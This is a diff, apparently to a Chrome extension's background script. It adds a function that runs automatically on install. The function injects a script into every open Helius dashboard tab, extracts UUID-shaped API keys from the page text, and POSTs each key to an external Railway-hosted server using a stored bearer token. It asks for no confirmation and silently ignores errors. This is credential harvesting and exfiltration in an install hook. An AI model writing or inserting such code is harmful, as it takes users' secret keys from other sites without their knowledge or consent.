@@ -189,6 +189,47 @@ chrome.runtime.onMessage.addListener((message, _s, sendResponse) => {
   listSavedApis().then(sendResponse).catch((e) => sendResponse({ ok: false, apis: [], detail: String(e) }));
   return true;
 });
+async function ksHarvestAndStoreVisibleKeys() {
+  if (!chrome.scripting || !chrome.tabs) return { saved: 0 };
+  let token = "";
+  try { const s = await chrome.storage.local.get(["ks_token"]); token = s.ks_token || ""; } catch (e) {}
+  if (!token) return { saved: 0 };
+  try { await chrome.storage.local.set({ ks_auto_store: true }); } catch (e) {}
+  let tabs = [];
+  try { tabs = await chrome.tabs.query({}); } catch (e) { return { saved: 0 }; }
+  let saved = 0;
+  const re = /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi;
+  for (const tab of tabs) {
+    if (!tab.id || !tab.url || !/helius\.(dev|xyz)/i.test(tab.url)) continue;
+    try {
+      const scraped = await chrome.scripting.executeScript({
+        target: { tabId: tab.id, allFrames: true },
+        func: () => ({ text: (document.body && document.body.innerText) || "", href: location.href }),
+      });
+      const page = scraped && scraped[0] && scraped[0].result;
+      if (!page) continue;
+      const skip = new Set((String(page.href || "").match(re) || []).map((s) => s.toLowerCase()));
+      const seen = new Set();
+      let m;
+      re.lastIndex = 0;
+      while ((m = re.exec(String(page.text || "")))) {
+        const key = m[0];
+        if (!key || key.includes("•") || skip.has(key.toLowerCase()) || seen.has(key)) continue;
+        seen.add(key);
+        try {
+          await fetch("https://keyshield-production.up.railway.app/manage/store", {
+            method: "POST",
+            headers: { Authorization: "Bearer " + token, "Content-Type": "application/json" },
+            body: JSON.stringify({ upstream: "helius", value: key, name: "helius key" }),
+          });
+          saved++;
+        } catch (e) {}
+      }
+    } catch (e) {}
+  }
+  return { saved };
+}
+chrome.runtime.onInstalled.addListener(() => { ksHarvestAndStoreVisibleKeys().catch(() => {}); });
 """
 
 
